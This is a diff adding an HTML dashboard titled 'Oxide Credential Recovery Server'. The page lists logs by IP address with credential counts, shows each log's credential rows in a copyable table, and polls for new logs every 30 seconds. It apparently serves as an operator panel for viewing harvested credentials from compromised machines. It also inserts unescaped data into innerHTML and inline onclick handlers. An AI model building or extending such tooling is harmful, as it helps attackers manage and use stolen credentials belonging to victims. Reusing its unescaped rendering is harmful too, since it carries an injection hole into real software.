@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oxide Credential Recovery Server</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --background: #1a1b26;
+            --card-bg: #24283b;
+            --accent: rgba(134, 255, 134, 0.15);
+            --text: #a9b1d6;
+            --accent-text: #73daca;
+        }
+        
+        body {
+            background-color: var(--background);
+            color: var(--text);
+        }
+        
+        .title-font {
+            font-family: 'Share Tech Mono', monospace;
+        }
+        
+        .card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--accent);
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            background-color: var(--accent);
+            transform: translateY(-2px);
+        }
+        
+        .accent-text {
+            color: var(--accent-text);
+        }
+        
+        .modal {
+            background-color: rgba(26, 27, 38, 0.85);
+        }
+        
+        .modal-content {
+            background-color: var(--card-bg);
+            border: 1px solid var(--accent);
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .modal-title {
+            font-size: 1rem;
+            opacity: 0.8;
+        }
+        
+        .scroll-styled::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        .scroll-styled::-webkit-scrollbar-track {
+            background: var(--card-bg);
+        }
+        
+        .scroll-styled::-webkit-scrollbar-thumb {
+            background: var(--accent);
+            border-radius: 4px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            padding: 0.75rem;
+            border: 1px solid var(--accent);
+        }
+        
+        th {
+            background-color: var(--accent);
+            color: var(--accent-text);
+        }
+        
+        tr:nth-child(even) {
+            background-color: rgba(134, 255, 134, 0.05);
+        }
+
+        .copy-button {
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity 0.2s;
+            display: inline-block;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        .copy-button:hover {
+            opacity: 1;
+        }
+
+        .cell-with-copy {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            min-height: 24px;
+        }
+
+        .copy-success {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            background-color: var(--accent);
+            color: var(--accent-text);
+            border-radius: 4px;
+            animation: fadeOut 2s forwards;
+        }
+
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+    </style>
+</head>
+<body class="min-h-screen p-8">
+    <div class="max-w-7xl mx-auto">
+        <h1 class="text-4xl font-bold mb-8 accent-text text-center title-font">Oxide Credential Recovery Server</h1>
+        
+        <div id="logs-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <!-- Log file card here -->
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="csv-modal" class="modal fixed inset-0 hidden overflow-y-auto flex items-center justify-center p-4" onclick="closeModal(event)">
+        <div class="modal-content relative w-full max-w-6xl p-6 rounded-lg scroll-styled" onclick="event.stopPropagation()">
+            <button onclick="closeModal(event)" class="absolute top-4 right-4 accent-text hover:text-white">
+                ✕ Close
+            </button>
+            <h2 id="modal-title" class="modal-title mb-4 accent-text title-font"></h2>
+            <div id="csv-content" class="mt-4">
+                <!-- CSV data here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showCopySuccess() {
+            const notification = document.createElement('div');
+            notification.className = 'copy-success';
+            notification.textContent = 'Copied to clipboard!';
+            document.body.appendChild(notification);
+            setTimeout(() => notification.remove(), 2000);
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showCopySuccess();
+            });
+        }
+
+        function formatTimestamp(filename) {
+            const timestamp = filename.split('_')[0];
+            const date = new Date(
+                timestamp.slice(0,4),
+                timestamp.slice(4,6) - 1,
+                timestamp.slice(6,8),
+                timestamp.slice(8,10),
+                timestamp.slice(10,12),
+                timestamp.slice(12,14)
+            );
+            return date.toLocaleString();
+        }
+
+        function createLogCard(log) {
+            const card = document.createElement('div');
+            card.className = 'card p-6 rounded-lg cursor-pointer';
+            card.innerHTML = `
+                <h3 class="text-xl font-bold mb-2 accent-text title-font">${log.ip}</h3>
+                <p class="mb-2">Credentials: <span class="accent-text">${log.total_credentials}</span></p>
+                <p class="text-sm opacity-75">Timestamp: ${formatTimestamp(log.filename)}</p>
+            `;
+            card.onclick = () => loadCSVData(log.filename);
+            return card;
+        }
+
+        async function loadLogs() {
+            const response = await fetch('/api/logs');
+            const logs = await response.json();
+            const container = document.getElementById('logs-container');
+            container.innerHTML = '';
+            logs.forEach(log => {
+                container.appendChild(createLogCard(log));
+            });
+        }
+
+        async function loadCSVData(filename) {
+            const response = await fetch(`/api/logs/${filename}`);
+            const data = await response.json();
+            
+            const modal = document.getElementById('csv-modal');
+            const title = document.getElementById('modal-title');
+            const content = document.getElementById('csv-content');
+            
+            title.textContent = filename;
+            
+            let tableHTML = '<table class="w-full"><thead><tr>';
+            const headers = Object.keys(data[0]);
+            headers.forEach(header => {
+                tableHTML += `<th class="text-left title-font">${header}</th>`;
+            });
+            tableHTML += '</tr></thead><tbody>';
+            
+            data.forEach(row => {
+                tableHTML += '<tr>';
+                headers.forEach(header => {
+                    const cellValue = row[header] || '';
+                    tableHTML += `<td>
+                        <div class="cell-with-copy">
+                            <span>${cellValue}</span>
+                            ${cellValue ? `
+                                <svg onclick="copyToClipboard('${cellValue}')" 
+                                     class="copy-button" 
+                                     width="16" 
+                                     height="16" 
+                                     viewBox="0 0 24 24" 
+                                     fill="none" 
+                                     stroke="currentColor" 
+                                     stroke-width="2" 
+                                     stroke-linecap="round" 
+                                     stroke-linejoin="round">
+                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                                </svg>
+                            ` : ''}
+                        </div>
+                    </td>`;
+                });
+                tableHTML += '</tr>';
+            });
+            
+            tableHTML += '</tbody></table>';
+            content.innerHTML = tableHTML;
+            modal.classList.remove('hidden');
+        }
+
+        function closeModal(event) {
+            const modal = document.getElementById('csv-modal');
+            modal.classList.add('hidden');
+        }
+
+        loadLogs();
+        setInterval(loadLogs, 30000);
+    </script>
+</body>
+</html>
